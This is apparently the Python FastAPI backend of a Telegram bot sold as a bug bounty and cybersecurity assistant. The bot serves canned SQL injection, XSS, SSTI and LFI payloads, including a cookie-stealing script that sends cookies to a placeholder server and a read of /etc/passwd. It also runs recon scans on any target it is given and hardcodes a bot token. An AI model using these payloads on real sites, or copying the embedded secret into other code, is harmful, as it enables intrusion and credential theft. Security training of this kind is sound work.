from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from .ai_service import cy30rt_ai
from pydantic import BaseModel
import httpx
import subprocess
import json
import os

app = FastAPI(title="Cy30rt_AI API", version="4.0.0")

# CORS - Allow all origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

BOT_TOKEN = "8722134255:AAGCDtKU0qBuh60z6fBt5RVP0_a7HTM1Vqc"

class ChatRequest(BaseModel):
    message: str
    language: str = "en"
    session_id: str = None

class ReconRequest(BaseModel):
    target: str
    options: dict = {}

@app.get("/")
async def root():
    return {
        "name": "Cy30rt_AI",
        "creator": "Abdulbasid Yakubu (cy30rt)",
        "status": "online",
        "version": "4.0.0"
    }

@app.post("/api/chat")
async def chat(request: ChatRequest):
    async def generate():
        async for chunk in cy30rt_ai.chat(request.message, request.language):
            yield chunk
    
    from fastapi.responses import StreamingResponse
    return StreamingResponse(generate(), media_type="text/plain")

@app.post("/api/recon")
async def run_recon(request: ReconRequest):
    try:
        target = request.target
        options = request.options
        
        if not target:
            return {"error": "No target provided", "success": False}
        
        cmd = ["reconix", target]
        
        if options.get("deep"):
            cmd.append("--deep")
        if options.get("js"):
            cmd.append("--js")
        if options.get("historical"):
            cmd.append("--historical")
        if options.get("aggressive"):
            cmd.append("--aggressive")
        if options.get("threads"):
            cmd.extend(["--threads", str(options["threads"])])
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr
        
        return {
            "success": True,
            "target": target,
            "output": output[:8000],
            "findings": {
                "subdomains": [],
                "technologies": [],
                "endpoints": [],
                "secrets": [],
                "vulnerabilities": []
            },
            "summary": {
                "subdomains_found": 0,
                "technologies_found": 0,
                "endpoints_found": 0,
                "secrets_found": 0,
                "vulnerabilities_found": 0
            }
        }
        
    except subprocess.TimeoutExpired:
        return {"error": "Scan timed out after 5 minutes", "success": False}
    except FileNotFoundError:
        return {"error": "Reconix not installed. Run: npm install -g @aquibk/reconix", "success": False}
    except Exception as e:
        return {"error": str(e), "success": False}

@app.post("/webhook")
async def webhook(request: Request):
    try:
        data = await request.json()
        print(f"Webhook received: {data}")
        
        if "message" in data:
            msg = data["message"]
            chat_id = msg["chat"]["id"]
            text = msg.get("text", "")
            
            # Handle /start command
            if text == "/start":
                async with httpx.AsyncClient() as client:
                    await client.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": chat_id,
                            "text": "🤖 **Welcome to Cy30rt_AI!**\n\nYour professional cybersecurity and bug bounty assistant.\n\n**Created by:** Abdulbasid Yakubu (cy30rt)\n\n**Available Commands:**\n/recon <target> - Run reconnaissance\n/payload <type> - Get payloads (sqli, xss, ssti, lfi)\n/cve <id> - Look up CVE\n/learn <topic> - Learn cybersecurity\n/help - Show all commands\n\nClick the button below to open the Mini App!",
                            "parse_mode": "Markdown",
                            "reply_markup": {
                                "inline_keyboard": [[{
                                    "text": "🚀 Open Cy30rt_AI Mini App",
                                    "web_app": {"url": "https://cy30rt-miniapp.onrender.com"}
                                }]]
                            }
                        }
                    )
            
            # Handle /help command
            elif text == "/help":
                async with httpx.AsyncClient() as client:
                    await client.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": chat_id,
                            "text": "🤖 **Cy30rt_AI Commands**\n\n📚 **Learning:**\n/learn sqli - SQL injection tutorial\n/learn xss - XSS tutorial\n/learn ssti - SSTI tutorial\n\n🔍 **Bug Bounty:**\n/recon <target> - Run reconnaissance\n/payload <type> - Get payloads (sqli, xss, ssti, lfi)\n/cve <id> - Look up CVE\n\n💬 **General:**\n/help - Show this help\n/who - About the creator\n\n⚠️ Always test only on authorized targets!\n\nFor full experience, open the Mini App!",
                            "parse_mode": "Markdown"
                        }
                    )
            
            # Handle /who or /creator command
            elif text in ["/who", "/creator", "/about"]:
                async with httpx.AsyncClient() as client:
                    await client.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": chat_id,
                            "text": "🤖 **Cy30rt_AI**\n\nI am a professional cybersecurity and bug bounty assistant created by **Abdulbasid Yakubu (cy30rt)** , a cybersecurity professional.\n\n**My capabilities:**\n• Teach cybersecurity concepts\n• Run reconnaissance on authorized targets\n• Generate attack payloads\n• Look up CVE information\n\n⚠️ Always practice on authorized systems only!\n\nFor full features, open the Mini App!",
                            "parse_mode": "Markdown"
                        }
                    )
            
            # Handle /recon command
            elif text.startswith("/recon"):
                target = text.replace("/recon", "").strip()
                if target:
                    async with httpx.AsyncClient() as client:
                        await client.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": f"🔍 **Starting reconnaissance on {target}...**\n\nThis may take 1-2 minutes.\n\nFor full interactive results with AI analysis, please use the Mini App:\nhttps://cy30rt-miniapp.onrender.com",
                                "parse_mode": "Markdown"
                            }
                        )
                else:
                    async with httpx.AsyncClient() as client:
                        await client.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": "📋 **Usage:** /recon <target>\n\nExample: /recon scanme.nmap.org\n\nFor full features, open the Mini App!",
                                "parse_mode": "Markdown"
                            }
                        )
            
            # Handle /payload command
            elif text.startswith("/payload"):
                vuln_type = text.replace("/payload", "").strip().lower()
                payloads = {
                    "sqli": "💉 **SQL Injection Payloads**\n\nAuthentication Bypass:\n`' OR '1'='1' --`\n`admin' --`\n\nUnion-Based:\n`' UNION SELECT null, username, password FROM users--`\n\nTime-Based:\n`' AND SLEEP(5)--`",
                    "xss": "🔓 **XSS Payloads**\n\nBasic Alert:\n`<script>alert('XSS')</script>`\n`<img src=x onerror=alert(1)>`\n\nCookie Stealing:\n`<script>fetch('https://your-server.com/steal?c='+document.cookie)</script>`",
                    "ssti": "🧠 **SSTI Payloads**\n\nJinja2 (Python):\n`{{7*7}}`\n`{{config}}`\n\nTwig (PHP):\n`{{_self.env.registerUndefinedFilterCallback('exec')}}`",
                    "lfi": "📂 **LFI/RFI Payloads**\n\nBasic LFI:\n`../../../../etc/passwd`\n`../../../etc/passwd%00`\n\nPHP Wrappers:\n`php://filter/convert.base64-encode/resource=index.php`"
                }
                
                if vuln_type in payloads:
                    async with httpx.AsyncClient() as client:
                        await client.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": payloads[vuln_type],
                                "parse_mode": "Markdown"
                            }
                        )
                else:
                    async with httpx.AsyncClient() as client:
                        await client.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": "📋 **Available payload types:** sqli, xss, ssti, lfi\n\nExample: /payload sqli",
                                "parse_mode": "Markdown"
                            }
                        )
            
            # Handle /cve command
            elif text.startswith("/cve"):
                cve_id = text.replace("/cve", "").strip().upper()
                if cve_id:
                    async with httpx.AsyncClient() as client:
                        await client.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": f"🔍 **Looking up {cve_id}...**\n\nFor complete CVE details with AI analysis, please use the Mini App:\nhttps://cy30rt-miniapp.onrender.com",
                                "parse_mode": "Markdown"
                            }
                        )
                else:
                    async with httpx.AsyncClient() as client:
                        await client.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": "📋 **Usage:** /cve CVE-YYYY-XXXX\n\nExample: /cve CVE-2024-6387",
                                "parse_mode": "Markdown"
                            }
                        )
            
            # Handle /learn command
            elif text.startswith("/learn"):
                topic = text.replace("/learn", "").strip().lower()
                lessons = {
                    "sqli": "📚 **SQL Injection Lesson**\n\nSQL injection occurs when user input is inserted directly into SQL queries.\n\nExample: `' OR '1'='1' --`\n\nFor full interactive lesson, open the Mini App!",
                    "xss": "📚 **XSS Lesson**\n\nCross-Site Scripting injects JavaScript into web pages.\n\nExample: `<script>alert('XSS')</script>`\n\nFor full interactive lesson, open the Mini App!",
                    "ssti": "📚 **SSTI Lesson**\n\nServer-Side Template Injection occurs when user input is inserted into template engines.\n\nTest: `{{7*7}}`\n\nFor full interactive lesson, open the Mini App!"
                }
                
                if topic in lessons:
                    async with httpx.AsyncClient() as client:
                        await client.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": lessons[topic],
                                "parse_mode": "Markdown"
                            }
                        )
                else:
                    async with httpx.AsyncClient() as client:
                        await client.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": "📋 **Available topics:** sqli, xss, ssti\n\nExample: /learn sqli",
                                "parse_mode": "Markdown"
                            }
                        )
            
            # Default response for any other message
            else:
                async with httpx.AsyncClient() as client:
                    await client.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": chat_id,
                            "text": f"🤖 **Cy30rt_AI**\n\nFor full AI chat, reconnaissance, payloads, and interactive features, please open the Mini App:\n\nhttps://cy30rt-miniapp.onrender.com\n\n**Available Commands:**\n/start - Welcome\n/help - All commands\n/recon <target> - Run reconnaissance\n/payload <type> - Get payloads\n/cve <id> - Look up CVE\n/learn <topic> - Learn cybersecurity",
                            "parse_mode": "Markdown"
                        }
                    )
        
        return {"status": "ok"}
        
    except Exception as e:
        print(f"Webhook error: {e}")
        return {"status": "error", "message": str(e)}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
